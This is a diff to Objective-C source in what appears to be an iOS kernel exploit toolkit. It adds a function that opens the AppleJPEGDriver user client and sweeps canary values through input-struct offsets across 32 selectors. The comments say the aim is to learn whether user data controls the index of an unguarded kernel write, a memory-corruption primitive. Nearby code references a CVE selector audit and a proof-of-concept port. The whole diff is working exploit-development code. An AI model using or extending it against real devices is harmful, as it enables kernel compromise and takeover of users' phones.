@@ -1143,6 +1143,91 @@ NSString *ModJpegSweep07(void)  { return ModJpegSweepRange(0, 7); }
 NSString *ModJpegSweep015(void) { return ModJpegSweepRange(0, 15); }
 NSString *ModJpegSweep023(void) { return ModJpegSweepRange(0, 23); }
 
+// Empirical test of the primitive candidate.  The only UNGUARDED indexed write
+// in the kext is `str w22, [x9, w15, uxtw]` at kext+0x174c, and its index
+// obj+0xcc is a verbatim copy of x1+0x178 (an unvalidated 14-word bulk copy at
+// kext+0x24ff0).  We cannot statically resolve x1, so test it empirically: if
+// x1 is our input struct, then slot +0x178 must be SETTABLE.  Probe slots
+// +0x150..+0x190 of the 0x1000 struct, one at a time, for every selector, and
+// report which slots the driver accepts (kr != 0xe00002c2).  An accepted +0x178
+// means we control the index of an unguarded kernel write.
+NSString *ModJpegIdxProbe(void) {
+    AveLog(@"[idxprobe] === which 0x1000 slots does each selector accept? (hunting +0x178) ===");
+    io_service_t svc = rs_jpeg_service();
+    if (!svc) return @"AppleJPEGDriver: service not found";
+
+    io_connect_t conn = 0;
+    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+    if (kr != KERN_SUCCESS || !conn) { IOObjectRelease(svc); return @"userclient not openable"; }
+
+    mach_port_t notify = MACH_PORT_NULL;
+    if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &notify) == KERN_SUCCESS)
+        mach_port_insert_right(mach_task_self(), notify, notify, MACH_MSG_TYPE_MAKE_SEND);
+    IOConnectSetNotificationPort(conn, 0, notify, 0);
+
+    const uint32_t W = 2048, H = 2048;
+    UIGraphicsBeginImageContext(CGSizeMake(W, H));
+    [[UIColor redColor] setFill];
+    UIRectFill(CGRectMake(0, 0, W, H));
+    UIImage *img = UIGraphicsGetImageFromCurrentImageContext();
+    UIGraphicsEndImageContext();
+    NSData *jpeg = UIImageJPEGRepresentation(img, 0.9);
+    size_t allocLen = jpeg ? ((jpeg.length + 0x3FFF) & ~(size_t)0x3FFF) : 0x1000;
+    NSDictionary *sp = @{(id)kIOSurfaceWidth: @(allocLen), (id)kIOSurfaceHeight: @1,
+                         (id)kIOSurfaceBytesPerElement: @1, (id)kIOSurfacePixelFormat: @0x20202020};
+    IOSurfaceRef_ src = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
+    NSDictionary *dp = @{(id)kIOSurfaceWidth: @(W), (id)kIOSurfaceHeight: @(H),
+                         (id)kIOSurfaceBytesPerElement: @4, (id)kIOSurfacePixelFormat: @0x42475241};
+    IOSurfaceRef_ dst = IOSurfaceCreate((__bridge CFDictionaryRef)dp);
+    if (!jpeg || !src || !dst) {
+        if (src) CFRelease(src);
+        if (dst) CFRelease(dst);
+        IOServiceClose(conn); IOObjectRelease(svc);
+        return @"surface/jpeg setup failed";
+    }
+    IOSurfaceLock(src, 0, NULL);
+    memcpy(IOSurfaceGetBaseAddress(src), jpeg.bytes, jpeg.length);
+    IOSurfaceUnlock(src, 0, NULL);
+    uint32_t srcID = IOSurfaceGetID(src), dstID = IOSurfaceGetID(dst);
+
+    // The bulk copy maps x1+0x158..0x180 -> obj+0xac..0xd4.  Probe that whole
+    // window plus a little either side.
+    const uint32_t LO = 0x148, HI = 0x188;
+    int accepted = 0;
+    for (uint32_t sel = 0; sel < 32; sel++) {
+        for (uint32_t slot = LO; slot < HI; slot += 4) {
+            uint8_t *big = (uint8_t *)malloc(0x1000);
+            uint8_t *bigo = (uint8_t *)malloc(0x1000);
+            if (!big || !bigo) { free(big); free(bigo); break; }
+            memset(big, 0, 0x1000);
+            memset(bigo, 0, 0x1000);
+            rs_jm_fill((RSJpegIn *)big, srcID, dstID, W, H, 0, 0x6161);
+            uint32_t canary = 0xC0FF0000u | slot;
+            memcpy(big + slot, &canary, 4);
+            size_t osz = 0x1000;
+            rs_jm_markSel(sel, 200 + (slot - LO));
+            kern_return_t k = IOConnectCallStructMethod(conn, sel, big, 0x1000, bigo, &osz);
+            if (k != (kern_return_t)0xe00002c2) {
+                accepted++;
+                AveLog(S(@"[idxprobe] ACCEPTED sel%u slot +%#x -> kr=%#x outSize=%zu",
+                         sel, slot, k, osz));
+                if (k == KERN_SUCCESS && osz > 0)
+                    rs_jm_dump(S(@"sel%u +%#x out", sel, slot), bigo, osz);
+            }
+            free(big);
+            free(bigo);
+        }
+        rs_jm_drain(notify, S(@"sel%u", sel));
+    }
+
+    IOServiceClose(conn);
+    CFRelease(src); CFRelease(dst);
+    IOObjectRelease(svc);
+    AveSetStatus(@"index probe done - see the log");
+    return S(@"index probe done: %d accepted (slot, selector) pairs in +%#x..+%#x",
+              accepted, LO, HI);
+}
+
 NSString *ModJpegMethods(void) {
     AveLog(@"[jpegmethods] === CVE-2026-20687 selector audit (hidgate-poc jpegmethods2 port) ===");
     io_service_t svc = rs_jpeg_service();
